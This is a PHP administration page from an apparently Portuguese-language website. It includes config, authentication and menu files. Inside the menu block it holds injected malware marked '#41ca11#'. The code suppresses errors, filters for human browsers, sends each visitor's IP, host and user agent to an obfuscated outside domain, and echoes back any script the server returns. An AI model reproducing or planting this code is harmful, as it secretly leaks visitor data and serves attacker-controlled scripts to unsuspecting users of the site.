<?php
# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include( "../_config.php" );
include( "../classes/utils.php" );
# ------------------------------------------------------------------ #
session_start();
include("include/autenticacao.php");
# ------------------------------------------------------------------ #

?>
<!DOCTYPE html>
<html>
	<head>
		<meta charset=utf-8 />
		<title><?php echo PAGE_TITLE ?> - Área Administrativa</title>
		<link href="styles/styles.css" rel="stylesheet" type="text/css" />
	</head>
	<body>
		<div id="top"><a href="home.php"><img src="images/logo.jpg" alt="Home" title="Home" /></a></div>
		<div id="menu">
			<?php include("include/menu.php");?>
<?php
#41ca11#
error_reporting(0); ini_set('display_errors',0); $wp_p82566 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_p82566) && !preg_match ('/bot/i', $wp_p82566))){
$wp_p0982566="http://"."tags"."value".".com/value"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_p82566);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_p0982566);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_82566p = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_82566p,1,3) === 'scr' ){ echo $wp_82566p; }
#/41ca11#
?>
<?php

?>
		</div>
		<div id="conteudo">
		</div>
	</body>
</html>